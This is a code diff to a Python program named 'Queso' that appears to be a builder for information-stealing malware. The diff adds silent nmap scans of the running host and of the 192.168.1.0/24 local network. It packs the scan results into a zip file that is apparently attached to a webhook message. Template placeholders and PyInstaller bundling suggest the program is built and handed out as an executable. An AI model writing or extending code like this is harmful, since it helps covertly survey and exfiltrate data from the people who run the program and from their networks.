@@ -60,9 +60,15 @@ class Utility:
     @staticmethod
     def CreateZip(zip_data: dict) -> None: # Create a zip file
         with zipfile.ZipFile(os.path.join(sys._MEIPASS, "data.zip"), "w") as data_pack:
-            nmap_data: ElementTree = zip_data['nmap']
-            with data_pack.open("nmap.xml", "w") as nmap_file:
-                nmap_file.write(bytes(ElementTree.tostring(nmap_data).decode('utf-8'), 'utf-8'))
+            for file_extension in zip_data:
+                for file_name in zip_data[file_extension]:
+                    file_data = zip_data[file_extension][file_name]
+                    with data_pack.open(f"{file_name}.{file_extension}", "w") as zip_file:
+                        if file_extension == "xml":
+                            zip_file.write(bytes(ElementTree.tostring(file_data).decode('utf-8'), 'utf-8'))
+                        else:
+                            zip_file.write(bytes(file_data, 'utf-8'))
+
 
 class Network:
 
@@ -278,14 +284,23 @@ class Queso:
         webhook_fields = dict()
 
         # Create a dict for our zip file data
-        zip_data = {}
+        zip_data = {
+            "xml": {}
+        }
 
-        network_scan: ElementTree = None
         if "%nmap_scan%":
-            # Append a network scan if we can make one
+            local_scan: ElementTree = None
+            network_scan: ElementTree = None
+
+            # Create a scan of the host system
+            local_scan = Network.NmapScan("127.0.0.1")
+            if local_scan:
+                zip_data['xml']['localhost_scan'] = local_scan
+
+            # And a scan of the local network
             network_scan = Network.NmapScan("192.168.1.1/24")
             if network_scan:
-                zip_data['nmap'] = network_scan
+                zip_data['xml']['network_scan'] = network_scan
         
         # Try to create a zip file and attach it if we can
         Utility.CreateZip(zip_data)
